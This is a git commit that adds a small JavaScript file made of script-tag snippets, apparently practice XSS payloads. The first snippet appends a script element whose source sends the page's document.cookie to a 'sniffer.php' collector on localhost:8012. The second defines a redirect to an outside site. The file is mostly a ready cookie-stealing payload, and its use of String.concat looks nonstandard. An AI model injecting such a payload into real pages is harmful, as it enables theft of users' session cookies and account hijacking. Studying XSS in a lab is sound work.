a76168332a436b4c5c4101cc38ca6aee410418df
arpsabbir <75604787+arpsabbir@users.noreply.github.com>
2021-05-07 21:19:04 +0600

    Add files via upload

---
+++ jscode.js
@@ -0,0 +1,12 @@
+<script> 
+var script=document.createElement('script');
+script.src=String.concat('http://localhost:8012/14/sniffer.php?',escape(document.cookie)); 
+document.body.appendChild(script);
+</script>
+
+<script> 
+var script=document.createElement('script');
+function Redirect() {window.location = "https://www.tutorialspoint.com";}
+document.body.appendChild(script);
+</script>
+
